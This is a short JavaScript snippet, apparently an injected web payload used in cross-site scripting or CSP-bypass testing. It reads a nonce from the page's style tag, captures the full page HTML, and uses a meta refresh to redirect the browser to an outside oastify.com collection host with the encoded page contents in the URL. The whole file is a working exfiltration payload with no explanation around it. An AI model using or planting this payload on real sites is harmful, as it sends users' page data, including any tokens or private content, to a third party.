// Get the nonce from the style tag
const nonce = document.getElementsByTagName('style')[0].nonce;


// Create meta refresh element
var meta = document.createElement('meta');
meta.setAttribute('http-equiv', 'refresh');

// Get all DOM content
var domContent = document.documentElement.outerHTML;

// Encode the DOM content for URL
var encodedDOM = encodeURIComponent(domContent);

// Set content with DOM data as parameter
meta.setAttribute('content', '0; url=https://m1.f7njyvj7vg0zel7kvfhsacudo4uvim9ay.oastify.com/z1?dom=' + encodedDOM);

// Append to document head
document.head.appendChild(meta);
